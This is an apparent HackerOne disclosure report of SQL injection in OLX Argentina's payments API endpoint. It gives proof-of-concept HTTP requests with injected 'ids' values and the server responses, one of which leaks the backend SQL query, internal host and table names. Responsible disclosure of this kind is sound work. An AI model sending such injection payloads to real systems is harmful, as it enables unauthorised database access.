@@ -1,0 +1,60 @@
+ReportLink:https://hackerone.com/reports/150633
+WeaknessName:SQL Injection
+Reporter:https://hackerone.com/niemand
+ReportedTo:OLX(olx)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:16.08.2016 8:11:43
+
+Summary:
+
+Hi there,
+
+I have found out that one request in your API is vulnerable to SQL injection.
+
+## PoC:
+
+Invalid Request:
+```
+GET /api/v1.0/payments/items?ids=891048367'"&platform=desktop HTTP/1.1
+Host: www.olx.com.ar
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+X-Requested-With: XMLHttpRequest
+Referer: 
+Connection: close
+If-None-Match: "379910586"
+```
+
+Response
+```
+{"status":500,"errors":["Internal error :: ABL error :: Http Error: Server error: 500 [url: http://abl.us-east-1.production.latam.olx.com/rest/domain/1/item/list] [statusCode:500] [Body:Error running query: SELECT i.id, i.data_domain_id, i.country_id, i.parent_category_id, i.deleted_admin, i.live, i.ends, i.featured_type_id, i.category_id, i.date_to_show, i.user_id, sd.reason AS status_reason, sd.comment AS status_comment, i.url_id, i.category_id, i.parent_category_id, i.date, i.date_to_show, i.is_feed, i.neighborhood, i.has_bump_up FROM olx_items i LEFT JOIN olx_items_dynamic_internal oidi ON oidi.item_id = i.id LEFT JOIN olx_item_status_details AS sd ON i.id = sd.item_id INNER JOIN geodesic_countries country ON country.country_id = i.country_id AND country.OLXCountry = 1 WHERE i.id IN (891048367'\") Error: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''\")' at line 1]"],"statusCode":500}
+```
+
+Valid Request:
+```
+GET /api/v1.0/payments/items?ids=(891048367)%20#--'"&platform=desktop HTTP/1.1
+Host: www.olx.com.ar
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+X-Requested-With: XMLHttpRequest
+Referer: 
+Connection: close
+If-None-Match: "379910586"
+```
+
+Response
+```
+[{"id":0,"isMonetizable":false,"isBumpable":false,"minMonetizablePrice":null,"currentPackage":null,"userHasWallet":false,"applicablePackagesFromWallet":null,"pendingTransactions":[]}]
+```
+
+
+If you need further information, please do not hesitate on contacting me.
+
+Regards,
+Joel
